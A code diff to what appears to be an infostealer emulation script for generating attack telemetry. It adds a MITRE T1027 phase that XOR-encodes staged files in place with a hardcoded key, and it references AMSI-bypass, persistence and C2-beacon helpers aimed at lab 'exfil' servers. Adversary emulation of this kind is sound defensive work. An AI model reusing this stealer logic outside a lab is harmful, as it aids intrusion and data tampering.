@@ -29,6 +29,7 @@ from c2_helper import emit_doh_query, emit_heartbeats, fronted_beacon, jittered_
 from naming_helper import phase_delay, pick_pipe, emit_pipe
 from defense_helper import emit_amsi_bypass
 from persistence_helper import emit_registry_run, emit_scheduled_task
+from obfuscation_helper import xor_bytes, emit_crypto_operation, emit_encoded_file_write
 
 
 EXFIL_SERVERS = ["10.13.37.50", "10.13.37.51"]
@@ -184,6 +185,19 @@ def main() -> int:
         emit_heartbeats(EXFIL_SERVERS[0], 4444, count=3,
                         process_name="stealer.exe",
                         min_interval=5.0, max_interval=25.0)
+
+    # --- Phase 5b: Data Obfuscation before cleanup (T1027) ---
+    set_phase("data_obfuscation")
+    xor_key = b"NyxTrace-Stealer-Key-2024"
+    if staging_dir.exists():
+        for f in staging_dir.iterdir():
+            if not f.is_file():
+                continue
+            raw = f.read_bytes()
+            encoded = xor_bytes(raw, xor_key)
+            f.write_bytes(encoded)
+            emit_crypto_operation("stealer.exe", "ENCODE", "XOR", len(raw))
+            time.sleep(phase_delay("file_encrypt"))
 
     # --- Phase 6: Cleanup ---
     set_phase("anti_forensics")
